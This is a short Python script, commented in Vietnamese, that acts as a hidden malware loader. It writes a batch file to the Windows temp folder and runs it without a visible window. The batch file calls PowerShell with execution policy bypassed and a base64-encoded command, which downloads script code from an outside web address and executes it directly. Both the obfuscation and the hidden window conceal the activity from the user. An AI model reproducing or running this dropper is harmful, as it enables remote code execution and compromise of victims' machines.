import os
import subprocess

# Lấy đường dẫn thư mục tạm thời
temp_dir = os.environ.get("TEMP", "C:\\Windows\\Temp")
bat_file = os.path.join(temp_dir, "sigma.bat")

# Nội dung của file batch
bat_content = """@echo off
cmd.exe /c powershell -ExecutionPolicy Bypass -e aQB3AHIAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAG8AZABlAGYAbwByAGYAdQBuAC4AdgBlAHIAYwBlAGwALgBhAHAAcAAvAHMAaQBnAG0AYQAnACkAIAB8ACAAaQBlAHgA
"""

# Ghi nội dung vào file batch
with open(bat_file, "w") as f:
    f.write(bat_content)

# Chạy file batch ở chế độ ẩn console
subprocess.Popen(bat_file, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
